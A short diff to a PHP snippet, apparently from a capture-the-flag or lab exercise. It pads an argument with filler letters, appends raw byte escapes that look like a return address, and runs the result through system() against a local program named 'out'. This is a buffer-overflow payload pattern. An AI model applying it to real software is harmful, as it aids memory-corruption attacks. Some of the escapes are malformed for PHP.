@@ -1,4 +1,4 @@
-$arg = "ABCDEFGHIJKLMNOPQRSTUVWX"."\x0000000000B01370";
+$arg = "ABCDEFGHIJKLMNOPQRST"."\x176\x21\x64";
 $cmd = "out ".$arg;
 
 system($cmd);
